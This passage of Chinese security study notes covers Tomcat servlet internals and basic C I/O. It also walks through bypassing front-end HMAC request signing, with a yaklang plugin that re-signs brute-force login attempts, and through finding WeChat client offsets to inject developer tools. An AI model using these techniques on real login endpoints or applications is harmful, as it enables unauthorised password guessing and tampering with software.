<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>配置tomcat后添加工件-》展开型</p>
<img src="/image/image-20240618104504716.png" alt="image-20240618104504716" style="zoom:80%;" />

<p>然后添加web模块</p>
<img src="/image/image-20240618104631583.png" alt="image-20240618104631583" style="zoom:80%;" />

<p>运行后访问地址：</p>
<img src="/image/image-20240618104705645.png" alt="image-20240618104705645"  />

<h2 id="从代码层面看servlet初始化与装载流程"><a href="#从代码层面看servlet初始化与装载流程" class="headerlink" title="从代码层面看servlet初始化与装载流程"></a>从代码层面看servlet初始化与装载流程</h2><p>使用嵌入式<code>tomcat</code>也就是所谓的<code>tomcat-embed-core</code>搭建环境</p>
<p>pom.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.y5neko<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ServletTest<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.83<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-jasper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.83<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Main.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.LifecycleException;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.startup.Tomcat;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> LifecycleException &#123;</span><br><span class="line">        <span class="type">Tomcat</span> <span class="variable">tomcat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tomcat</span>();</span><br><span class="line">        tomcat.getConnector(); <span class="comment">//tomcat 9.0以上需要加这行代码，参考：https://blog.csdn.net/qq_42944840/article/details/116349603</span></span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> tomcat.addWebapp(<span class="string">&quot;&quot;</span>, <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;.&quot;</span>).getAbsolutePath());</span><br><span class="line">        Tomcat.addServlet(context, <span class="string">&quot;helloServlet&quot;</span>, <span class="keyword">new</span> <span class="title class_">HelloServlet</span>());</span><br><span class="line">        context.addServletMappingDecoded(<span class="string">&quot;/hello&quot;</span>, <span class="string">&quot;helloServlet&quot;</span>);</span><br><span class="line">        tomcat.start();</span><br><span class="line">        tomcat.getServer().await();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>HelloServlet.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;Hello, World!&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="servlet流程分析"><a href="#servlet流程分析" class="headerlink" title="servlet流程分析"></a>servlet流程分析</h3><p>在<code>org.apache.catalina.core.StandardWrapper#setServletClass</code>处下断点调试：</p>
<img src="/image/image-20240618110454952.png" alt="image-20240618110454952" style="zoom:80%;" />

<p>查找他的调用位置发现位于<code>org.apache.catalina.startup.ContextConfig#configureContext</code></p>
<img src="/image/image-20240618110724914.png" alt="image-20240618110724914" style="zoom:80%;" />

<p>跟进后观察以下逻辑</p>
<p><img src="/image/image-20240618112034632.png" alt="image-20240618112034632"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123;</span><br><span class="line">            <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper();</span><br><span class="line">            <span class="keyword">if</span> (servlet.getLoadOnStartup() != <span class="literal">null</span>) &#123;</span><br><span class="line">                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (servlet.getEnabled() != <span class="literal">null</span>) &#123;</span><br><span class="line">                wrapper.setEnabled(servlet.getEnabled().booleanValue());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setName(servlet.getServletName());</span><br><span class="line">            Map&lt;String,String&gt; params = servlet.getParameterMap();</span><br><span class="line">            <span class="keyword">for</span> (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;</span><br><span class="line">                wrapper.addInitParameter(entry.getKey(), entry.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setRunAs(servlet.getRunAs());</span><br><span class="line">            Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();</span><br><span class="line">            <span class="keyword">for</span> (SecurityRoleRef roleRef : roleRefs) &#123;</span><br><span class="line">                wrapper.addSecurityReference(</span><br><span class="line">                        roleRef.getName(), roleRef.getLink());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setServletClass(servlet.getServletClass());</span><br><span class="line">            <span class="type">MultipartDef</span> <span class="variable">multipartdef</span> <span class="operator">=</span> servlet.getMultipartDef();</span><br><span class="line">            <span class="keyword">if</span> (multipartdef != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">maxFileSize</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">                <span class="type">long</span> <span class="variable">maxRequestSize</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">fileSizeThreshold</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getMaxFileSize()) &#123;</span><br><span class="line">                    maxFileSize = Long.parseLong(multipartdef.getMaxFileSize());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getMaxRequestSize()) &#123;</span><br><span class="line">                    maxRequestSize = Long.parseLong(multipartdef.getMaxRequestSize());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getFileSizeThreshold()) &#123;</span><br><span class="line">                    fileSizeThreshold = Integer.parseInt(multipartdef.getFileSizeThreshold());</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                wrapper.setMultipartConfigElement(<span class="keyword">new</span> <span class="title class_">MultipartConfigElement</span>(</span><br><span class="line">                        multipartdef.getLocation(),</span><br><span class="line">                        maxFileSize,</span><br><span class="line">                        maxRequestSize,</span><br><span class="line">                        fileSizeThreshold));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (servlet.getAsyncSupported() != <span class="literal">null</span>) &#123;</span><br><span class="line">                wrapper.setAsyncSupported(</span><br><span class="line">                        servlet.getAsyncSupported().booleanValue());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setOverridable(servlet.isOverridable());</span><br><span class="line">            context.addChild(wrapper);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;String, String&gt; entry :</span><br><span class="line">                webxml.getServletMappings().entrySet()) &#123;</span><br><span class="line">            context.addServletMappingDecoded(entry.getKey(), entry.getValue());</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>首先通过<code>webxml.getServlets()</code>获取的所有<code>Servlet</code>定义，并建立循环；然后创建一个<code>Wrapper</code>对象，并设置<code>Servlet</code>的加载顺序、是否启用（即获取<code>&lt;/load-on-startup&gt;</code>标签的值）、<code>Servlet</code>的名称等基本属性；接着遍历<code>Servlet</code>的初始化参数并设置到<code>Wrapper</code>中，并处理安全角色引用、将角色和对应链接添加到<code>Wrapper</code>中；如果<code>Servlet</code>定义中包含文件上传配置，则根据配置信息设置<code>MultipartConfigElement</code>；设置<code>Servlet</code>是否支持异步操作；通过<code>context.addChild(wrapper);</code>将配置好的<code>Wrapper</code>添加到<code>Context</code>中，完成<code>Servlet</code>的初始化过程。</p>
<p>上面大的<code>for</code>循环中嵌套的最后一个<code>for</code>循环则负责处理<code>Servlet</code>的<code>url</code>映射，将<code>Servlet</code>的<code>url</code>与<code>Servlet</code>名称关联起来。</p>
<p>也就是说，<code>Servlet</code>的初始化主要经历以下六个步骤：</p>
<ul>
<li>创建<code>Wapper</code>对象；</li>
<li>设置<code>Servlet</code>的<code>LoadOnStartUp</code>的值；</li>
<li>设置<code>Servlet</code>的名称；</li>
<li>设置<code>Servlet</code>的<code>class</code>；</li>
<li>将配置好的<code>Wrapper</code>添加到<code>Context</code>中；</li>
<li>将<code>url</code>和<code>servlet</code>类做映射</li>
</ul>
<h1 id="前端加密"><a href="#前端加密" class="headerlink" title="前端加密"></a>前端加密</h1><h2 id="验证签名防篡改"><a href="#验证签名防篡改" class="headerlink" title="验证签名防篡改"></a>验证签名防篡改</h2><blockquote>
<p>签名验证（又叫验签或签名）是验证请求参数是否被篡改的一种常见安全手段，验证签名方法主流的有两种，一种是 KEY+哈希算法，例如 HMAC-MD5 &#x2F; HMAC-SHA256 等，另外生成签名的规则可能为：username&#x3D;*&amp;password&#x3D;*。在提交和验证的时候需要分别对提交数据进行处理，签名才可以使用和验证</p>
</blockquote>
<img src="/image/image-20231213160008765.png" alt="image-20231213160008765" style="zoom:80%;" />

<p>如果我们抓包修改密码再发包，就会导致签名验证失败</p>
<img src="/image/image-20231213160103188.png" alt="image-20231213160103188" style="zoom: 43%;" />

<p>尝试爆破</p>
<img src="/image/image-20231213160813542.png" alt="image-20231213160813542" style="zoom: 50%;" />

<p>发现仅有当密码和原来一致时才通过，我们只要尝试在发包爆破的同时改变签名的值就行了</p>
<p><strong>签名产生流程</strong></p>
<p>大部分签名的逻辑都藏在前端 JavaScript 中，签名中字段的顺序一般来说是有意义的，JavaScript 中的 Object Properties 是有顺序的，因此我们只需要找到产生签名需要的算法即可</p>
<p>直接在浏览器定位到表单处</p>
<img src="/image/image-20231213161156710.png" alt="image-20231213161156710" style="zoom:50%;" />

<p>可以看到这里的表格没有method和action，说明表单的提交行为可能是由js来操作，或者action给当前页面</p>
<p>如果是通过js操作，那么应该是需要操作 DOM 元素来取值计算，我们直接在浏览器中查看表单绑定的事件</p>
<img src="/image/image-20231213162033656.png" alt="image-20231213162033656" style="zoom: 50%;" />

<p>可以看到事件的源地址，直接跟进去</p>
<img src="/image/image-20231213162150276.png" alt="image-20231213162150276" style="zoom:50%;" />

<p>我们在源码中发现了加密的js算法实现，分析一下</p>
<img src="/image/image-20231213162314943.png" alt="image-20231213162314943" style="zoom:80%;" />

<p>可以看到这里是定义了生成key和加解密的函数，然后通过常量key接受了密钥</p>
<img src="/image/image-20231213162524036.png" alt="image-20231213162524036" style="zoom:80%;" />

<p>接下来，getData函数通过DOM获取到了username和password的值，返回了一串json</p>
<p>outputObj函数首先通过一个常量word将账号密码转变成了username&#x3D;admin&amp;password&#x3D;password的形式</p>
<p>接着通过Encrypt产生了签名，然后将结果转变成新的json格式</p>
<p>最后submitJSON函数首先禁用了浏览器默认的表单提交方法，然后构造了新的提交方式</p>
<p>我们在浏览器里面跟一下整个流程，首先看一下key的值</p>
<img src="/image/image-20231213164001766.png" alt="image-20231213164001766" style="zoom:80%;" />

<p>十六进制</p>
<img src="/image/image-20231213164129749.png" alt="image-20231213164129749" style="zoom:80%;" />

<p>接着来看一下签名生成的算法，根据我们输入的账号密码的word值为username&#x3D;admin&amp;password&#x3D;password</p>
<p>然后通过CryptoJS的HmacSHA256函数，使用key：1234123412341234作为密钥，生成：</p>
<img src="/image/image-20231213165408502.png" alt="image-20231213165408502" style="zoom:80%;" />

<p>现在我们知道了生成签名的过程，现在我们就可以尝试编写插件来实现算法，这里用yaklang为例</p>
<p>先在WebFuzzer模块中把要发包的password设置为变量</p>
<img src="/image/image-20231213173334953.png" alt="image-20231213173334953" style="zoom: 80%;" />

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//模板</span></span><br><span class="line"><span class="comment">//&#123;&#123;yak(signRequest|admin|password)&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义签名的生成函数，通过codec的sha256函数</span></span><br><span class="line">func <span class="title function_">sign</span>(<span class="params">user, pass</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> codec.<span class="title class_">EncodeToHex</span>(codec.<span class="title class_">HmacSha256</span>(<span class="string">&quot;1234123412341234&quot;</span>, f<span class="string">`username=<span class="subst">$&#123;user&#125;</span>&amp;password=<span class="subst">$&#123;pass&#125;</span>`</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">signRequest = <span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">    pairs := result.<span class="title class_">SplitN</span>(<span class="string">&quot;|&quot;</span>, <span class="number">2</span>)		<span class="comment">//通过|分割signRequest后面的参数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">sign</span>(pairs[<span class="number">0</span>], pairs[<span class="number">1</span>])		<span class="comment">//传入参数返回给signRequest</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/image/image-20231213173021572.png" alt="image-20231213173021572"></p>
<p>在热加载中可以通过 <code>&#123;&#123;yak(signRequest|...)&#125;&#125;</code>来调用，直接在签名处插入我们的模板</p>
<img src="/image/image-20231213173213463.png" alt="image-20231213173213463" style="zoom:80%;" />

<p>成功绕过</p>
<h2 id="前端JS加密表单"><a href="#前端JS加密表单" class="headerlink" title="前端JS加密表单"></a>前端JS加密表单</h2><h1 id="微信小程序hook"><a href="#微信小程序hook" class="headerlink" title="微信小程序hook"></a>微信小程序hook</h1><h2 id="基地址查找"><a href="#基地址查找" class="headerlink" title="基地址查找"></a>基地址查找</h2><p>打开微信，先不登录，用x64dbg附加</p>
<img src="/image/image-20240103195527991.png" alt="image-20240103195527991" style="zoom:80%;" />

<p>找到参数带<code>--log-level</code>的进程，这个是主进程，其余的都是子进程，选择附加</p>
<img src="/image/image-20240103200446126.png" alt="image-20240103200446126" style="zoom:80%;" />

<p>程序自动暂停时，可以删除所有断点再继续运行，如果线程有挂起可以恢复所有线程</p>
<img src="/image/image-20240103201011574.png" alt="image-20240103201011574" style="zoom:80%;" />

<p>在符号视图里找到<code>wechatappex.exe</code>，记录下此时<code>wechatappex.exe</code>的基址：<code>0x00007FF7F53E0000</code></p>
<p>双击跟进汇编窗口，找到push的位置搜索字符串引用</p>
<img src="/image/image-20240103202127474.png" alt="image-20240103202127474" style="zoom:80%;" />

<p>查找字符串<code>LaunchApplet init_config.productId</code>，这是小程序加载初始化配置项的方法</p>
<img src="/image/image-20240103212648573.png" alt="image-20240103212648573" style="zoom:80%;" />

<p>双击跟进到汇编窗口，往上找到函数的起始处，也就是return的后面一步</p>
<img src="/image/image-20240103214125319.png" alt="image-20240103214125319" style="zoom:80%;" />

<p>我们下一个断点，然后随便开一个小程序</p>
<img src="/image/image-20240103220356227.png" alt="image-20240103220356227" style="zoom:80%;" />

<img src="/image/image-20240103214327200.png" alt="image-20240103214327200" style="zoom:80%;" />

<p>在断点处暂停，我们在栈中跟随此时rax的地址，往下翻可以看到一些小程序的信息</p>
<img src="/image/image-20240103214616186.png" alt="image-20240103214616186" style="zoom:80%;" />

<img src="/image/image-20240103214837549.png" alt="image-20240103214837549" style="zoom:80%;" />

<p>到这一步说明我们位置找对了，记录下我们刚刚下的断点的地址：<code>0x00007FF7F7E2C20A</code></p>
<p>接下来回到引用窗口，查找<code>wechat_web.html</code></p>
<img src="/image/image-20240103215727562.png" alt="image-20240103215727562" style="zoom:80%;" />

<p>双击跟进汇编窗口</p>
<img src="/image/image-20240103215907995.png" alt="image-20240103215907995" style="zoom:80%;" />

<p>我们可以看到wechat_web和wechat_app相关的几步</p>
<p>记录下存放wechat_web的ds中的段基址：<code>0x00007FF7FCE03D33</code></p>
<p>为了防止检测，wechat_app的地址就记录下面一行的：<code>0x00007FF7F7CC1D66</code></p>
<img src="/image/image-20240103221240883.png" alt="image-20240103221240883" style="zoom:80%;" />

<h2 id="偏移量计算"><a href="#偏移量计算" class="headerlink" title="偏移量计算"></a>偏移量计算</h2><p>我们刚刚一共拿到四个数据：</p>
<p><code>wechatappex.exe</code>的基地址：<code>0x00007FF7F53E0000</code></p>
<p><code>LaunchApplet init_config.productId</code>函数的起始地址：<code>0x00007FF7F7E2C20A</code></p>
<p><code>wechat_web</code>有关ds中的段基址：<code>0x00007FF7FCE03D33</code></p>
<p><code>webchat_app</code>的地址：<code>0x00007FF7F7CC1D66</code></p>
<p>接下来可以计算偏移量：</p>
<p><code>LaunchAppletBegin</code>可以通过productId的地址减去<code>wechatappex.exe</code>的基地址得到</p>
<img src="/image/image-20240103223033447.png" alt="image-20240103223033447" style="zoom:80%;" />

<p><code>WechatWebHtml</code>可以通过<code>wechat_web</code>有关ds中的段基址减去<code>wechatappex.exe</code>的基地址得到</p>
<img src="/image/image-20240103223305837.png" alt="image-20240103223305837" style="zoom:80%;" />

<p><code>WechatAppHtml</code>可以通过<code>webchat_app</code>的地址减去<code>wechatappex.exe</code>的基地址得到</p>
<img src="/image/image-20240103223408475.png" alt="image-20240103223408475" style="zoom:80%;" />

<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>接下来用我们得到的偏移量文件通过<code>WeChatOpenDevTools</code>验证一下</p>
<img src="/image/image-20240103223930595.png" alt="image-20240103223930595" style="zoom:80%;" />

<img src="/image/image-20240103224205234.png" alt="image-20240103224205234" style="zoom:80%;" />

<p>注入完整开发者工具成功。</p>
<h1 id="C语言"><a href="#C语言" class="headerlink" title="C语言"></a>C语言</h1><h2 id="自动类型转换"><a href="#自动类型转换" class="headerlink" title="自动类型转换"></a>自动类型转换</h2><img src="/image/134S535R-0.png" alt="img" style="zoom:80%;" />

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">float</span> PI = <span class="number">3.14159</span>;</span><br><span class="line">    <span class="type">int</span> s1, r = <span class="number">5</span>;</span><br><span class="line">    <span class="type">double</span> s2;</span><br><span class="line">    s1 = r * r * PI;</span><br><span class="line">    s2 = r * r * PI;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;s1=%d, s2=%f\n&quot;</span>, s1, s2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20240126163926046.png" alt="image-20240126163926046" style="zoom: 80%;" />

<h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><ul>
<li>puts()：只能输出字符串，并且输出结束后会自动换行。</li>
<li>putchar()：只能输出单个字符。</li>
<li>printf()：可以输出各种类型的数据。</li>
</ul>
<img src="/image/image-20240126164414975.png" alt="image-20240126164414975" style="zoom: 67%;" />

<h3 id="对齐输出"><a href="#对齐输出" class="headerlink" title="对齐输出"></a>对齐输出</h3><p><code>%-9d</code>中，<code>d</code>表示以十进制输出，<code>9</code>表示最少占9个字符的宽度，宽度不足以空格补齐，<code>-</code>表示左对齐。综合起来，<code>%-9d</code>表示以十进制输出，左对齐，宽度最小为9个字符。大家可以亲自试试<code>%9d</code>的输出效果。</p>
<p>printf() 格式控制符的完整形式如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">%[flag][width][.precision]type</span><br></pre></td></tr></table></figure>

<p><strong>例子</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a1=<span class="number">20</span>, a2=<span class="number">345</span>, a3=<span class="number">700</span>, a4=<span class="number">22</span>;</span><br><span class="line">    <span class="type">int</span> b1=<span class="number">56720</span>, b2=<span class="number">9999</span>, b3=<span class="number">20098</span>, b4=<span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span> c1=<span class="number">233</span>, c2=<span class="number">205</span>, c3=<span class="number">1</span>, c4=<span class="number">6666</span>;</span><br><span class="line">    <span class="type">int</span> d1=<span class="number">34</span>, d2=<span class="number">0</span>, d3=<span class="number">23</span>, d4=<span class="number">23006783</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%-9d %-9d %-9d %-9d\n&quot;</span>, a1, a2, a3, a4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%-9d %-9d %-9d %-9d\n&quot;</span>, b1, b2, b3, b4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%-9d %-9d %-9d %-9d\n&quot;</span>, c1, c2, c3, c4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%-9d %-9d %-9d %-9d\n&quot;</span>, d1, d2, d3, d4);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20240126164615017.png" alt="image-20240126164615017" style="zoom: 80%;" />

<h3 id="Windows和Linux的输出缓存机制"><a href="#Windows和Linux的输出缓存机制" class="headerlink" title="Windows和Linux的输出缓存机制"></a>Windows和Linux的输出缓存机制</h3><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><img src="/image/image-20240126165014124.png" alt="image-20240126165014124" style="zoom:67%;" />

<p>windows在输出第一行后，延时3秒输出了第二行，sleep成功生效无异常。</p>
<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><img src="/image/image-20240126165604168.png" alt="image-20240126165604168" style="zoom:80%;" />

<p>linux在延时了3秒后再将第一行和第二行一起输出出来。</p>
<p><strong>原因</strong></p>
<p>从本质上讲，printf() 执行结束以后数据并没有直接输出到显示器上，而是放入了缓冲区，直到遇见换行符<code>\n</code>才将缓冲区中的数据输出到显示器上。</p>
<h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><ul>
<li>scanf()：和 printf() 类似，scanf() 可以输入多种类型的数据。</li>
<li>getchar()、getche()、getch()：这三个函数都用于输入单个字符。</li>
<li>gets()：获取一行数据，并作为字符串处理。</li>
</ul>
<p>scanf() 是最灵活、最复杂、最常用的输入函数，但它不能完全取代其他函数。</p>
<h4 id="内存中存放的格式"><a href="#内存中存放的格式" class="headerlink" title="内存中存放的格式"></a>内存中存放的格式</h4><p>数据是以二进制的形式保存在内存中的，字节（Byte）是最小的可操作单位。为了便于管理，我们给每个字节分配了一个编号，使用该字节时，只要知道编号就可以，就像每个学生都有学号，老师会随机抽取学号来让学生回答问题。字节的编号是有顺序的，从 0 开始，接下来是 1、2、3……</p>
<img src="/image/1045231316-0.png" alt="img" style="zoom:80%;" />

<img src="/image/image-20240126170159598.png" alt="image-20240126170159598" style="zoom:67%;" />

<p><code>%p</code>是一个新的格式控制符，它表示以十六进制的形式（带小写的前缀）输出数据的地址。如果写作<code>%P</code>，那么十六进制的前缀也将变成大写形式。</p>
<img src="/image/10452364L-1.png" alt="img" style="zoom:80%;" />

